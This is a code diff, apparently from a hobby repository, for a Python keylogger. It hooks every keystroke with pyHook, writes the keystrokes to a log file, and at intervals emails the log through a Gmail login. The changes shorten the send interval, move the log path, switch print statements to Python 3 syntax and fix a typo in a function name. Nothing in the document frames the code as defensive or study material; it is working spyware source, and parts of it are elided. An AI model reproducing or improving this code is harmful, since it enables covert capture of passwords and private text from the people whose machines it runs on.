@@ -1,9 +1,9 @@
 import pyHook, pythoncom, sys, logging
 import time, datetime
 
-wait_seconds = 600
+wait_seconds = 60
 timeout = time.time() + wait_seconds
-file_log = 'C:\\data_files\\dat.txt'
+file_log = 'E:\\dat.txt'
 
 def TimeOut():
     if time.time() > timeout:
@@ -30,11 +30,11 @@ def SendEmail(user, pwd, recipient, subject, body):
         server.login(gmail_user, gmail_pass)
         server.sendmail(FROM, TO, message)
         server.close()
-        print 'Correo enviado satifactoriamente'
+        print ('Correo enviado satifactoriamente')
     except:
-        print 'Error al mandar correo'
+        print ('Error al mandar correo')
 
-def FormatAndSendLogEmail():
+def FormatAndSendEmail():
     with open(file_log, 'r+') as f:
         actualdate = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         data = f.read().replace('\n', '');
@@ -51,7 +51,7 @@ def OnKeyboardEvent(event):
     return True
 
 hooks_manager = pyHook.HookManager()
-hooks_manager.KeyDown = OnKeyoardEvent
+hooks_manager.KeyDown = OnKeyboardEvent
 hooks_manager.HookKeyboard()
 
 while True:
@@ -60,3 +60,4 @@ while True:
         timeout = time.time() + wait_seconds
 
     pythoncom.PumpWaitingMessages()
+
